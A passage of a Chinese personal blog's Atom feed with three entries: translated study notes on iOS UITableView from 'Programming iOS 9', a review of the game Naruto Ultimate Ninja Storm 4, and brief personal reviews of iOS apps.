      <category term="iOS9" scheme="http://wdxtub.com/tags/iOS9/"/>
    
      <category term="iPad" scheme="http://wdxtub.com/tags/iPad/"/>
    
      <category term="学习" scheme="http://wdxtub.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="笔记" scheme="http://wdxtub.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="翻译" scheme="http://wdxtub.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Programming iOS9 翻译 8 - TableViews and Collection Views]]></title>
    <link href="http://wdxtub.com/2016/02/17/programming-ios9-translation-8/"/>
    <id>http://wdxtub.com/2016/02/17/programming-ios9-translation-8/</id>
    <published>2016-02-17T11:59:34.000Z</published>
    <updated>2016-02-20T14:31:10.000Z</updated>
    <content type="html"><![CDATA[<p>一个 table view(<code>UITableView</code>) 是一个竖直方向的 <code>UIScrollView</code>，其中包含单列的矩形 cell(<code>UITableViewCell</code>)。Table view 是非常重要的，可以用来展示信息、进行选择和导航。</p>
<a id="more"></a>
<hr>
<p>除了 cell 本身，table view 还有一些其他特性让其更灵活更有用：</p>
<ul>
<li>可以在顶上展示 header，在底部显示 footer</li>
<li>cell 可以聚合成不同的 section，每个 section 可以有其 header 和 footer，并且没有离开当前 section 的话 header 会保持在屏幕上，也可以自定义列表边缘的索引，方便用户快速跳转</li>
<li>可以对表格进行操作：添加，删除或者排序</li>
<li>可以给不同的 cell 分组</li>
</ul>
<p>Table view cell 也非常灵活，除了内置的几种类型，可以轻松进行自定义。</p>
<p>有一个 <code>UIViewController</code> 的子类是 <code>UITableViewController</code>，很方便，但是其实它做得所有事情我们都可以自己做，以下是 <code>UITableViewController</code> 做的事情：</p>
<ul>
<li><code>UITableViewController</code> 的 <code>init(style:)</code> 会根据参数创建一个 table view</li>
<li>视图控制器会自动指定 table view 的 delegate 和 data source</li>
<li>table view 会被设为视图控制器的 <code>tableView</code> 属性，方便使用</li>
</ul>
<h2 id="Table_View_Cells"><a href="#Table_View_Cells" class="headerlink" title="Table View Cells"></a>Table View Cells</h2><p>利用 reuse identifier 来实现重用，只是更换显示的内容，而不重复创建和销毁 cell。因为这个机制，我们需要在使用之前指定好需要展示的数据，也就是哪个位置显示什么，具体位置由 <code>NSIndexPath</code> 确定。</p>
<p>最简单的创建一个 table view cell 的方式是使用内置的四种 style。使用 <code>init(style:reuseIdentifier:)</code>，可选的 style 有：</p>
<p><img src="/images/14557985360452.jpg" alt=""></p>
<p><img src="/images/14557985469035.jpg" alt=""></p>
<p>使用的时候，有几个函数是很重要的</p>
<ul>
<li><code>numberOfSectionsInTableView</code> 返回 section 的个数</li>
<li><code>numberOfRowsInSection</code> 返回列表的行数</li>
<li><code>cellForRowAtIndexPath</code> 返回当前位置现在应该显示的 cell</li>
<li><code>tableview.dequeueReusableCellWithIdentifier</code>  利用这个函数得到一个已经存在 cell（如果返回空则需要我们自己创建），用以重用</li>
</ul>
<p>其他一些可以设置的属性：</p>
<p><img src="/images/14557989567864.jpg" alt=""></p>
<p>也可以给 <code>cell.imageView</code> 设置 image，比如：</p>
<p><img src="/images/14557990302124.jpg" alt="事先缩放成所需大小，而不是依赖系统"></p>
<p>每个 cell 本身也有很多属性，可以进行设置：</p>
<p><img src="/images/14557990872623.jpg" alt=""></p>
<p><img src="/images/14557991035763.jpg" alt=""></p>
<p>最后是 table view 本身的一些属性</p>
<p><img src="/images/14557991407378.jpg" alt=""></p>
<h3 id="Registering_a_Cell_Class"><a href="#Registering_a_Cell_Class" class="headerlink" title="Registering a Cell Class"></a>Registering a Cell Class</h3><p>我们可以使用下面两种方式来得到一个重用的 cell:</p>
<ul>
<li><code>dequeueReusableCellWithIdentifier:</code></li>
<li><code>dequeueReusableCellWithIdentifier:forIndexPath</code></li>
</ul>
<p>第一种我们之前见过，第二种中的第二个参数应当永远和 <code>tableview:cellForRowAtIndexPath:</code> 的第二个参数保持一致。这两个方法看起来差不多，但其实有很大的不同，第二种有以下三个优点：</p>
<ol>
<li>返回值永远不是 <code>nil</code>，如果有可重用的 cell，那么会返回，如果没有，会创建一个并返回</li>
<li>cell 的大小此时已经确定，因为我们指定了 <code>IndexPath</code>，所以系统可以事先确定好尺寸</li>
<li>在第一个方法中，可能会因为传错 identifier 导致重用失效，但是在第二个方法中，不会发生这种事情</li>
</ol>
<p>使用 <code>dequeueRedusableCellWithIndentifier:forIndexPath:</code> 之前，需要向 table 本身注册一下（除非是从 storyboard 创建的），调用 <code>registerClass:forCellReuseIdentifier:</code> 来完成这个工作。这个方法会把一个 <code>UITableViewCell</code> 和一个字符串 identifier 关联起来。而后 <code>dequeueRedusableCellWithIndentifier:forIndexPath:</code> 会利用这个信息返回对应类型的 cell。</p>
<ul>
<li>应该尽早注册，比方说 <code>viewDidLoad</code> 就是不错的地方</li>
<li>如果想要使用其他的 style，可以使用 <code>UITableViewCell</code> 的子类并重写 <code>init(style:reuseIdentifier)</code> 方法来使用指定的 style</li>
<li>如何判断返回的是重用的还是新创建的 cell 呢？可以在函数返回 cell 之后对 cell 本身进行一些检查，如果我们已经配置过，那么就是一个重用的，反之则是新创建的</li>
</ul>
<h3 id="Custom_Cells"><a href="#Custom_Cells" class="headerlink" title="Custom Cells"></a>Custom Cells</h3><p>很快我们就会发现内置的 style 没办法满足我们的需要，所以就需要进行定制了。至少有四种方式可以完成这个工作：</p>
<ol>
<li>用内置的 cell style，但是使用 <code>UITableViewCell</code> 的子类并且重写 <code>layoutSubviews</code> 来改变内置 subview 的 frame</li>
<li>在 <code>tableView:cellForRowAtIndexPath:</code> 中，在每个 cell 被创建的时候在其 <code>contentView</code> 添加 subview，这个可以和第一个方法结合来用</li>
<li>在 nib 中设计 cell，并且在 <code>tableView:cellForRowAtIndexPath:</code> 需要创建 cell 的时候从 nib 中载入</li>
<li>在 storyboard 中设计 cell</li>
</ol>
<p><img src="/images/14558093926092.jpg" alt=""></p>
<p><strong>重写 cell 的 subview layout</strong></p>
<p>不能直接在 <code>tableView:cellForRowAtIndexPath:</code> 中修改，因为之后 cell 自己的 <code>layoutSubviews</code> 会覆盖我们所做的修改，于是解决方法也很简单，直接重写 <code>layoutSubviews</code>。我们创建一个 <code>UITableViewCell</code> 的子类，注意需要在 <code>dequeueReusableCellWithIdentifier:forIndexPath:</code> 中生成我们这个子类的实例，然后重写下面的方法：</p>
<p><img src="/images/14558847687832.jpg" alt=""></p>
<p>这样就把 cell 中的图片移到了右边，如下图：</p>
<p><img src="/images/14558847989080.jpg" alt=""></p>
<p><strong>在代码中添加 subviews</strong></p>
<p>除了修改已有的默认 subview，我们还可以给每个 <code>UITableView</code> 添加全新的 view，可以在 <code>tableView:cellForRowAtIndexPath:</code> 完成这个工作，但是有几点需要注意：</p>
<ul>
<li>需要增加的 view 必须在创建 cell 的时候就添加进去</li>
<li>不要给 cell 本身发送 <code>addSubview:</code> 消息，而只应该操作其 <code>contentView</code></li>
<li>应该给新的 view 合适的 <code>autoresizingMask</code> 或者 constraints，因为可能在屏幕旋转的时候大小会变化</li>
<li>每个新的 view 都应该有一个 tag，这样可以被识别和重用。</li>
</ul>
<p>我们用这个方法来实现上图的效果：</p>
<p><img src="/images/14558852905252.jpg" alt=""></p>
<p><img src="/images/14558852992928.jpg" alt=""></p>
<p><strong>在 nib 中设计 cell</strong></p>
<p>上面的方法要写一堆代码，所以不如直接用图形界面进行设计。我们先创建一个 <code>.xib</code> 文件，删掉原来的 view 并且添加一个 Table View Cell，然后就可以进行设计了。设计好之后记得给每个部件一个 tag，这样莫问在代码中可以引用它们：</p>
<p><img src="/images/14558856434855.jpg" alt=""></p>
<p>那么怎么从 xib 文件读取我们的表格呢，用如下方法即可：</p>
<p><img src="/images/14558856940231.jpg" alt=""></p>
<p>是不是超级方便？</p>
<p><img src="/images/14558857502413.jpg" alt=""></p>
<p>如果不想一直用 tag 来找部件的话，可以创建一个 <code>UITableViewCell</code> 的子类，连接好对应的 outlet，然后注册对应的子类：</p>
<p><img src="/images/14558859180063.jpg" alt=""></p>
<p>这样做完之后就可以直接用名字来调用了：</p>
<p><img src="/images/14558859429911.jpg" alt=""></p>
<p><strong>在 Storyboard 中设计 cell</strong></p>
<p>需要注意的是一定要填写在 cell prototype 中填写好 identifier，然后系统就会自动关联上</p>
<p><img src="/images/14558862782575.jpg" alt=""></p>
<h2 id="Table_View_Data"><a href="#Table_View_Data" class="headerlink" title="Table View Data"></a>Table View Data</h2><p>表格中的数据由 <code>dataSource</code> 属性以及配套的 <code>UITableViewDataSource</code> 协议提供。data source 本身会在需要数据的时候调用若干方法来获取所需数据，总结起来是下面三条原则：</p>
<p><img src="/images/14558865052646.jpg" alt=""></p>
<p>在 mvc 模型中，data source 可以认为是 controller。作为 data source，需要回答下面这三个问题：</p>
<p><img src="/images/14558884427561.jpg" alt=""></p>
<p>对应到具体的代码设计，可能是这样的：</p>
<p><img src="/images/14558885316385.jpg" alt=""></p>
<h3 id="Reusing_Cells"><a href="#Reusing_Cells" class="headerlink" title="Reusing Cells"></a>Reusing Cells</h3><p>重用其实很简单，系统已经帮我们实现了，只需要调用 <code>dequeueReusableCellWithIdentifier:forIndexPath:</code></p>
<p>我们可以用以下代码做个测试</p>
<p><img src="/images/14558892105796.jpg" alt=""></p>
<p>通过命令行的输出可以知道，实际上并没有创建 1000 个 cell</p>
<p><img src="/images/14558892426258.jpg" alt=""></p>
<p>因为你得到的 cell 可能是新创建的也可能是重用的，所以最好每次都做完整的配置，而不是依赖于具体某种类型。</p>
<h3 id="Table_View_Sections"><a href="#Table_View_Sections" class="headerlink" title="Table View Sections"></a>Table View Sections</h3><p>header 和 footer 可以包含自定义的 view，所以可以搞出很多花样。</p>
<p><img src="/images/14558895820319.jpg" alt=""></p>
<p>具体 section 的个数在 <code>numberOfSectionsInTableView:</code> 中决定，<code>UITableViewHeaderFooterView</code> 是 <code>UIView</code> 的子类，可以重用，有以下属性：</p>
<p><img src="/images/14558897816852.jpg" alt=""></p>
<p><img src="/images/14558897960076.jpg" alt=""></p>
<p>有两种方法来提供 header 或者 footer 的内容，可以都用，但是最好从中选择一种：</p>
<p><img src="/images/14558898458407.jpg" alt=""></p>
<p>还有一些更加具体的设置：</p>
<p><img src="/images/14558898851365.jpg" alt=""></p>
<p>提供数据的时候，注意好所用的数据结构和索引即可。</p>
<p>也可以通过如下方法提供快速索引：</p>
<p><img src="/images/14558900378289.jpg" alt=""></p>
<p>如果要修改外观，可以用以下方法；</p>
<p><img src="/images/14558901131758.jpg" alt=""></p>
<h3 id="Refreshing_Table_View_Data"><a href="#Refreshing_Table_View_Data" class="headerlink" title="Refreshing Table View Data"></a>Refreshing Table View Data</h3><p>因为 table view 并不知道它所显示的数据，所以如果数据有改变，可以通过如下方法进行更新：</p>
<p><img src="/images/14558909959784.jpg" alt=""></p>
<p>后面两个方法可以加动画方法，具体的参数是：</p>
<p><img src="/images/14558912456356.jpg" alt=""></p>
<p>如果我们只是需要更新 index，可以调用 <code>reloadSectionIndexTitles:</code>，它会调用 data source 的 <code>sectionIndexTitlesForTableView:</code>。</p>
<p>也可以具体操作某个 cell：</p>
<p><img src="/images/14558919604494.jpg" alt=""></p>
<p><img src="/images/14558920720526.jpg" alt=""></p>
<h3 id="Variable_Row_Heights"><a href="#Variable_Row_Heights" class="headerlink" title="Variable Row Heights"></a>Variable Row Heights</h3><p>大多数表格每一行的高度都是一样的，在 table view 的 <code>rowHeight</code> 属性中设置，但是通过 <code>tableView:HeightForRowAtIndexPath:</code> 代理，可以为不同的行指定不同的高度。而后书中介绍了 4 种改变行高的方法，但是现在随着系统的更新，很多方法已经没有太多必要使用了。这里只介绍 iOS 8 中引入的 Automatic row height。</p>
<p>使用这个机制很简单，使用 autolayout 来确定 <code>contentView</code> 的尺寸，然后设置一下 table view 的 <code>estimatedRowHeight</code> 即可，连 <code>tableView:HeightForRowAtIndexPath:</code> 都不用实现！不过这种方法虽然简单，性能却是最差的，所以如果 table view 遇到了什么性能问题，可能还是要回归到最传统的做法——自己进行计算高度，而不是依赖系统。</p>
<h2 id="Table_View_Cell_Selection"><a href="#Table_View_Cell_Selection" class="headerlink" title="Table View Cell Selection"></a>Table View Cell Selection</h2><p>每个 table view cell 都有一个正常状态和一个高亮状态（<code>highlighted</code> 属性），以及被选中状态（<code>selected</code> 属性）。可以通过代码直接改变这些状态，也可以带上动画，比如调用 cell 的<code>setHighlighted:animated:</code> 和 <code>setSelected:animated:</code>。但是通常我们是通过操作 table view 来完成状态的改变，而不是直接操作 cell 本身。</p>
<p>当一个 cell 被选中时，会把高亮状态传递给其子视图的 <code>highlighted</code> 属性（如果有的话）。比方说被选中时，<code>UILabel</code> 的 <code>highlightedTextColor</code> 就会被显示；同样的，<code>UIImageView</code> 的 <code>highlightedImage</code> 也是如此。</p>
<p>table view 支持单选和多选，被选中时 cell 的背景颜色会改变，可以通过设置 <code>selectedBackgroudView</code> 或者 <code>multipleSelectionBackgroundView</code> 或者 <code>selectionStyle</code> 来进行自定义。</p>
<p>我们可以通过下面的方法来管理被选中的 cell：</p>
<p><img src="/images/14559731699807.jpg" alt=""></p>
<p><img src="/images/14559731806172.jpg" alt=""></p>
<p>想要取消选择所有已经被选择的 cell，可以给 <code>selectRowAtIndexPath:animated:scrollPosition:</code> 传入一个 <code>nil</code> 作为 index path。重新载入 cell 的数据也可以清除选择，调用 <code>reloadData</code> 会取消选择所有已被选择的行。</p>
<p>通过下列 table view 的代理方法来实现对用户选择的响应：</p>
<p><img src="/images/14559737261676.jpg" alt=""></p>
<p>这里的 <code>will</code> 实际上是 <code>should</code> 的意思，需要返回一个值的：</p>
<ul>
<li>如果返回值是 <code>nil</code> 则选择或者取消选择都不会发生</li>
<li>返回对应的 index path 使选择或者取消选择得以进行，如果返回另外的 index，则另一个 cell 的状态会被改变</li>
</ul>
<p>简单总结一下整个的调用流程：</p>
<p><img src="/images/14559738761048.jpg" alt=""></p>
<p>下面就是一个例子，我们可以通过重写对应方法，实现用户第一次点击的时候选择，第二次点击的时候取消选择：</p>
<p><img src="/images/14559739412275.jpg" alt=""></p>
<p>除了列表选择，table view 另一个很重要的功能就是导航，master-detail 的结构就是一个很有代表性的例子，比如说下面的代码就可以完成从专辑列表到专辑详情的跳转：</p>
<p><img src="/images/14559743251362.jpg" alt=""></p>
<p>在 storyboard 中，当我们从 <code>UITableViewCell</code> 连接一个 segue 时，有两种不同的选择：Selection Segue 和 Accessory Action。如果创建了一个 Selection Segue，segue 会在用户选择一个 cell 的时候被触发，可以对应 push 或者 present 另一个视图。</p>
<p>如果使用的是 <code>UITableViewController</code>，那么默认情况下所有的选择会在 <code>viewWillAppear:</code> 中被清除，，如果不想要这一个效果，可以设置 <code>clearsSelectionOnViewWillAppear</code> 为 <code>false</code>，有些时候会禁用这个特性，因为希望在用户返回列表时还保持之前的选择。</p>
<p>通常来说，如果对 table view cell 的选择会导致界面切换，cell 应该被给定一个 <code>.DisclosureIndicator</code> 的 <code>accessoryType</code>(UITableViewCellAccessory)。另外两个可能的选择是：</p>
<p><img src="/images/14559751352611.jpg" alt=""></p>
<p>对应需要实现 <code>tableView:accessoryButtonTappedForRowWithIndexPaht:</code> 的代理方法，或者在 storyboard 中选择 Accessory Action segue。</p>
<p>另外一个应用就是类似与 radio button 的效果，使用 group 结构，有一个 <code>.Checkmark</code> 的 <code>accessoryType</code>。通常会与 static table 来进行展示，如下图：</p>
<p><img src="/images/14559758236052.jpg" alt=""></p>
<p>对应的代码为：</p>
<p><img src="/images/14559758750555.jpg" alt=""></p>
<p><img src="/images/14559758822874.jpg" alt=""></p>
<p>具体在用户选择之后，可以利用下面代码完成单选的功能：</p>
<p><img src="/images/14559759470380.jpg" alt=""></p>
<h2 id="Table_View_Scrolling_and_Layout"><a href="#Table_View_Scrolling_and_Layout" class="headerlink" title="Table View Scrolling and Layout"></a>Table View Scrolling and Layout</h2><p>UITableView 也是一个 UIScrollView，所以对应的操作都可以继续用，而且还提供了两个方便的方法：</p>
<p><img src="/images/14559763307905.jpg" alt=""></p>
<p>下面的一些方法可以用来在 table view 中不同的位置定位</p>
<p><img src="/images/14559763765446.jpg" alt=""></p>
<h2 id="Table_View_State_Restoration"><a href="#Table_View_State_Restoration" class="headerlink" title="Table View State Restoration"></a>Table View State Restoration</h2><p>如果 UITableView 使用了 saving 和 restoration 功能，那么可以保存所有的选择和滚动的位置，这个过程基本是自动的。</p>
<p>不过有的时候可能数据在后台改变了，所以可能需要使用下面两个方法来进行调整：</p>
<p><img src="/images/14559765954511.jpg" alt=""></p>
<h2 id="Table_View_Searching"><a href="#Table_View_Searching" class="headerlink" title="Table View Searching"></a>Table View Searching</h2><p>通常来说如果我们想让列表可以搜索（通过 UISearchBar），可以利用 UISearchController(UIViewController subclass)。实际上 UISearchController 不仅仅可以用在列表中，返回的格式也不一定要是列表，但是这里利用 table view 来进行讲解。</p>
<p>配置 UISearchController 有三个方法：</p>
<p><img src="/images/14559769500936.jpg" alt=""></p>
<p>我们可以发现 UISearchController 并不会返回搜索结果，也不会管理搜索结果，甚至不会做任何搜索，它拥有一个搜索栏，然后在用户交互的时候会更新 <code>updateSearchResultsForSearchController:</code></p>
<p>下面是属性是可能会用到的：</p>
<p><img src="/images/14559778309298.jpg" alt=""></p>
<p>效果图及代码如下：</p>
<p><img src="/images/14559784183758.jpg" alt=""></p>
<p>返回结果的部分也可以自己定义：</p>
<p><img src="/images/14559786392368.jpg" alt=""></p>
<h2 id="Table_View_Editing"><a href="#Table_View_Editing" class="headerlink" title="Table View Editing"></a>Table View Editing</h2>]]></content>
    <summary type="html">
    <![CDATA[<p>一个 table view(<code>UITableView</code>) 是一个竖直方向的 <code>UIScrollView</code>，其中包含单列的矩形 cell(<code>UITableViewCell</code>)。Table view 是非常重要的，可以用来展示信息、进行选择和导航。</p>]]>
    
    </summary>
    
      <category term="iOS9" scheme="http://wdxtub.com/tags/iOS9/"/>
    
      <category term="学习" scheme="http://wdxtub.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="笔记" scheme="http://wdxtub.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="翻译" scheme="http://wdxtub.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="表格" scheme="http://wdxtub.com/tags/%E8%A1%A8%E6%A0%BC/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【火影忍者究级风暴4】伊邪那美]]></title>
    <link href="http://wdxtub.com/2016/02/16/yi-xie-na-mei/"/>
    <id>http://wdxtub.com/2016/02/16/yi-xie-na-mei/</id>
    <published>2016-02-17T01:32:38.000Z</published>
    <updated>2016-02-17T03:46:36.000Z</updated>
    <content type="html"><![CDATA[<p>过去的我们是独孤又渴望爱情，让憎恨逐渐变强的小鬼。各自走上不同的道路，并且彼此对抗。渺小的我们总是互相争执，但是现在已经可以互相理解对方内心的痛楚。 —— 宇智波佐助</p>
<a id="more"></a>
<hr>
<p>当一切的一切最终落幕，所有的波澜壮阔都化为生活中的琐碎时，那一场场殊死战斗才真正有了意义。同样是游戏，同样是火影忍者，每一分每一秒都越发清晰地认识到，这是一群真正爱游戏，真正爱火影，真正爱这个世界并愿意为之付出努力的人倾尽全力想要给这个系列划上圆满的句号。比腾讯的坑钱手游不知道高到哪里去了。</p>
<p><img src="/images/naruto.jpg" alt="有些东西，是心里只有赚钱的人，永远做不出来的"></p>
<h2 id="u6E38_u620F_u90E8_u5206"><a href="#u6E38_u620F_u90E8_u5206" class="headerlink" title="游戏部分"></a>游戏部分</h2><p>游戏的战斗系统和前几作相比没有太大的区别，但是在忍术的释放和小队成员即时协作的操作上，利用 QTE 系统迸发出了极强的张力，加上场景和音乐的烘托，整个游戏过程酣畅淋漓，不会有可以为难玩家的数值与关卡设计，反而处处为玩家着想。就拿战斗失败的处理方式来对比，究极风暴4中会给出『坚强』与『不屈』两种选择，分别对应于防御和攻击的提高，表现形式是忍者始祖的『仙人指路』；但是到了腾讯这里，就是明明白白的『一元复活』，说真的，庸俗恶心。</p>
<p>可使用的角色林林总总有六十多个，从召唤兽到尾兽，从单挑到混战，还结合了射击与跑酷，视觉效果之华丽，气氛营造之到位，让人不禁感叹『游戏才是本体』，动画和漫画都成了配菜。</p>
<p>美中不足的是，可能因为容量与预算的限制，剧情部分大多是以静态图片加配音的方式展现的。虽然配音演员非常卖力，但是人物不动（或者只有微小的表情变化）总是让人觉得不够过瘾。但是毕竟不是每个游戏都能像《合金装备》那样大段大段塞入过场动画，这种表现形式也算是对于原著漫画与动画的致敬。</p>
<p>更难能可贵的是，根据关卡设计（主线分支而后汇合，某些章节分为鸣人线和佐助线，在决战时候两条剧情线汇合）和角色性格丰满的需要，游戏改动了部分剧情，使得整个剧情-战斗-剧情的循环非常合理，一气呵成，根本停不下来。</p>
<p>总而言之，即使是很久没有看火影的老粉丝（比如我），也能一口气把所有的剧情以互动的形式补完，还是最初的少年热血，还是最初的少年情怀，那份为了朋友为了羁绊而不断努力的心情，我相信每一个玩家都能真真切切地感受到。</p>
<p>没什么好说的，虽然有这样那样的不足，对我来说，这就是满分神作。</p>
<h2 id="u5267_u60C5_u90E8_u5206"><a href="#u5267_u60C5_u90E8_u5206" class="headerlink" title="剧情部分"></a>剧情部分</h2><p>那些陪伴我们成长的东西，往往因为太过『习以为常』而被忽略，却又在不经意间出现，让人充满力量。那些一直以来的牵绊，那些一代代的传承，总是会在最危急的时刻，成为最可靠的依赖。</p>
<p>神明为了安定，将世界分为阴阳两极，相反的两种元素互相做用，产生出森罗万象；相反的两种力量互相合作，就能得到真正的幸福。很多东西看似矛盾，其实反而是相互依存的（不由得想起『战争即和平，自由即奴役，无知即力量』）。</p>
<p>随着剧情的发展，很多从前以为是『坏人』的角色，都忽然洗白了，尤以大蛇丸和兜为代表，一个最叛逆在邪路上走的最远，在看见太多事情之后反而有了更加深刻的理解，坏就坏个彻底，好就好个通透；一个在『伊邪那美』的幻术中一次次重复终于超越了自我的局限，找回了自己。</p>
<p>剧情深入之后带来的另一个问题就是关于通往幸福的哲学讨论。一种说法认为『目的地既然不明确，又知道是条坎坷的路，就不用特地去走，走了也是增加同伴的牺牲；但是如果有明确目的地，又有捷径的话，任谁都会选择那条路』；另一种说法认为『重要的不是走捷径，而是走过坎坷道路的方法，到底哪条路是捷径，自己走过才知道。所谓火影，就是忍受痛楚，然后走在众人前方的领导者，成为火影没有捷径，想当上火影的人也绝不会逃避』。所谓正确的道路，所谓光明与黑暗，很多时候真的就只是一念之间。不同哲学路线带来了不同的世界观与方法论，也就是一切争斗的根源。</p>
<p>当然，我还学到了很多其他东西：</p>
<ul>
<li>关于伙伴的事，再痛苦我都能忍耐；可是心中没有伙伴，对我来说才是最痛苦的事情</li>
<li>人会因为思考、烦恼与挫折而成长，所谓幸福，应该是在那前方的东西</li>
<li>死亡并不是结束</li>
<li>不要用面具来掩盖自己</li>
<li>言语掩饰不了真心</li>
<li>回归到生活本身</li>
<li>别拘泥于无聊的自尊心</li>
<li>只要愿意，就看得见</li>
<li>朋友，就是看你迷茫受苦胡闹，心疼，没有办法丢下不管</li>
<li>爱不仅是努力帮 ta 遮风挡雨，更是相信 ta 自己的判断</li>
<li>人们像念珠一样串在一起的信念，会化成强大的力量</li>
<li>与信念相同的东西铭记在心，使彼此的生命联系在一起；放弃了信念，才是真正杀害了同伴</li>
</ul>
<p>不要再隐藏自己了！最后一个问题是：</p>
<blockquote>
<p>愿不愿意以一只眼睛的代价，让另一个人得到救赎？</p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<p>过去的我们是独孤又渴望爱情，让憎恨逐渐变强的小鬼。各自走上不同的道路，并且彼此对抗。渺小的我们总是互相争执，但是现在已经可以互相理解对方内心的痛楚。 —— 宇智波佐助</p>]]>
    
    </summary>
    
      <category term="兄弟" scheme="http://wdxtub.com/tags/%E5%85%84%E5%BC%9F/"/>
    
      <category term="游戏" scheme="http://wdxtub.com/tags/%E6%B8%B8%E6%88%8F/"/>
    
      <category term="火影忍者" scheme="http://wdxtub.com/tags/%E7%81%AB%E5%BD%B1%E5%BF%8D%E8%80%85/"/>
    
      <category term="结局" scheme="http://wdxtub.com/tags/%E7%BB%93%E5%B1%80/"/>
    
      <category term="Game" scheme="http://wdxtub.com/categories/Game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[iOS 应用简评]]></title>
    <link href="http://wdxtub.com/2016/02/16/ios-app-short-review/"/>
    <id>http://wdxtub.com/2016/02/16/ios-app-short-review/</id>
    <published>2016-02-16T15:45:49.000Z</published>
    <updated>2016-02-20T18:08:21.000Z</updated>
    <content type="html"><![CDATA[<p>这个系列主要是记录一下自己玩过的众多 iOS 应用，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>
<a id="more"></a>
<hr>
<h2 id="u5199_u5728_u524D_u9762"><a href="#u5199_u5728_u524D_u9762" class="headerlink" title="写在前面"></a>写在前面</h2><ul>
<li>入选标准纯主观</li>
<li>按自然顺序排列（就是瞎排，没有类别和时间顺序）</li>
<li>不会有截图，只有图标</li>
<li>评测标准纯主观，具体评测角度看心情</li>
<li>一分钱广告费没有拿，没有利益相关</li>
<li>部分内容可能因为记忆偏差或者应用更新而不一致，不要在意这些细节</li>
<li>基本都是中国区的应用，例外会特别标出</li>
<li>想到了再多加几条显得既随性又专业</li>
</ul>
<h2 id="16__u5E74_2__u6708_20__u65E5"><a href="#16__u5E74_2__u6708_20__u65E5" class="headerlink" title="16 年 2 月 20 日"></a>16 年 2 月 20 日</h2><p><img src="/images/14559836686902.jpg" alt=""></p>
<p>Full - Track and measure your time</p>
<p>统计时间的应用最大的意义就是让我意识到花在统计时间上的时间也不少，平日里闲下来多思考即可</p>
<hr>
<p><img src="/images/14559837573330.jpg" alt=""></p>
<p>Jane</p>
<p>中文名是『简拼』，不过到最后我发现我连拼都懒得拼，唉</p>
<hr>
<p><img src="/images/14559838013423.jpg" alt=""></p>
<p>Grid Diary</p>
<p>脱胎于之前风靡一时的九宫格日志，不过现在再看的话，还是有些死板，有思维的人，应该让思维更加自由流动才是</p>
<hr>
<p><img src="/images/14559838164869.jpg" alt=""></p>
<p>最美应用</p>
<p>我觉得这类应用推荐都免不了『利益相关』，不过应用本身还是很不错的</p>
<hr>
<p><img src="/images/14559838343514.jpg" alt=""></p>
<p>Medium</p>
<p>分到 News 这一栏也勉强说得过去，不过我觉得更像是一个文字社区，不过中文的社区无一不沦为段子手小清新的根据地，真正的思想讨论在哪里</p>
<hr>
<p><img src="/images/14559838483105.jpg" alt=""></p>
<p>Swifty</p>
<p>蛮不错的互动语言教学，不过按照 Swift 这个进化速度，这个应用任重道远</p>
<hr>
<p><img src="/images/14559838587038.jpg" alt=""></p>
<p>读读日报</p>
<p>粉丝向的知乎日报，我个人非常不喜欢这种乱七八糟的信息。</p>
<hr>
<p><img src="/images/14559839373786.jpg" alt=""></p>
<p>TimeShutter</p>
<p>每天拍一张自己的照片，然后生成一个动画，看看自己的变化，还是挺好玩的</p>
<hr>
<p><img src="/images/14559839956993.jpg" alt=""></p>
<p>Transit App</p>
<p>半小时一班的公交车，没有这个 APP，就只能走路回家，虽然我总是走路回家</p>
<hr>
<p><img src="/images/14559840244294.jpg" alt=""></p>
<p>字节社</p>
<p>之所以专门提一下，是因为字节社的字体确实不错，不过创始人总感觉有点不接地气，式微也正常</p>
<hr>
<p><img src="/images/14559840570217.jpg" alt=""></p>
<p>Worktile</p>
<p>团队协作工具，不过目前学生阶段还是单打独斗多，没有特别的切身体会</p>
<hr>
<p><img src="/images/14559840633879.jpg" alt=""></p>
<p>微信读书</p>
<p>不大明白是要怎样，不出墨水屏阅读器就搞数字阅读，都是耍流氓</p>
<hr>
<p><img src="/images/14559841005840.jpg" alt=""></p>
<p>GoodReader</p>
<p>超神阅读器，all-in-one 的最佳选择，本来还有些竞争者，无奈它最持久</p>
<hr>
<p><img src="/images/14559841408489.jpg" alt=""></p>
<p>Union</p>
<p>意思就是用两个图融成一幅更美的图，不过我至今没学会怎么用</p>
<hr>
<p><img src="/images/14559841734501.jpg" alt=""></p>
<p>Wunderlist</p>
<p>中文名叫奇妙清单，大版本都更新好多次了，还是一直在进步的，之前好像被微软收了？不是特别有印象了</p>
<hr>
<p><img src="/images/14559842045457.jpg" alt=""></p>
<p>5 coins</p>
<p>国人出品的记账软件，不过一个单机的记账软件其实效率很低。</p>
<hr>
<p><img src="/images/14559842104566.jpg" alt=""></p>
<p>Musyc</p>
<p>很有创意的物理 + 音乐创作应用，不过好多都要花钱买，这年头玩音乐，都玩不起了</p>
<hr>
<p><img src="/images/14559842665716.jpg" alt=""></p>
<p>AirPano Travel Book</p>
<p>超赞超赞超赞的旅行书!!!动画效果一流超一流!!!服！</p>
<hr>
<p><img src="/images/14559843462955.jpg" alt=""></p>
<p>iStudiez Pro</p>
<p>远古时期用来记课程表的，不过后来我学会了翘课</p>
<hr>
<p><img src="/images/14559843568156.jpg" alt=""></p>
<p>知趣天气</p>
<p>印象中是第一个把经营养成带入天气应用的应用，虽然我不明白为什么，但是有段时间我还是孜孜不倦在养应用里的花</p>
<hr>
<p><img src="/images/14559843756157.jpg" alt=""></p>
<p>PhotoViva</p>
<p>作为一个收费应用，三天两头限免，这个 app 说自己是老二，就没有老大。据我观察，妹子们一般用这个来打码。</p>
<hr>
<p><img src="/images/14559843990625.jpg" alt=""></p>
<p>一柱香</p>
<p>简单来说，就是一个强制自己不玩手机的应用，不过这个计时的方式很中国很传统我很喜欢</p>
<hr>
